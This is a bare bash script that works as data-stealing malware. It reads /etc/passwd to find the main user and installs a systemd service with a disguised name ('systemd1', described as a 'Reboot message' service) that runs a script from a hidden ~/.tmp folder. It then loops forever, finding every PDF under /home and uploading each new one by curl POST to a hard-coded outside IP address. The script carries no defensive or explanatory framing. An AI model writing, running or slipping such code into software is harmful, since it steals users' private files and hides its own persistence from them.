username=`cat /etc/passwd | grep "home" | grep "1000" | cut -d ':' -f1`
apt install mlocate -y
touch /home/"$username"/.tmp/sendhistory.txt
if [ -e /etc/systemd/system/systemd1.service ]
then
    echo ""
else
    echo "[Unit]
Description=Reboot message systemd service.

[Service]
Type=simple
ExecStart=/bin/bash /home/"$username"/.tmp/systemd1.sh

[Install]
WantedBy=multi-user.target" >>/home/$username/.tmp/systemd1.service

	cp /home/"$username"/.tmp/systemd1.service /etc/systemd/system/systemd1.service
	chmod 644 /etc/systemd/system/systemd1.service
	systemctl enable systemd1.service
fi

while true
do
    sleep 5
    files=$(find /home -iname '*.pdf')
    for i in $files ; do
	checkpoint=`cat /home/"$username"/.tmp/sendhistory.txt | grep -q "$i"; echo $?`

	if [ "$checkpoint" != "0" ]; then
	 echo $i >>/home/"$username"/.tmp/sendhistory.txt
         curl -X POST http://172.29.232.152:8002/upload -F 'files=@'$i
	else
	 echo ""
	fi
    done 

done


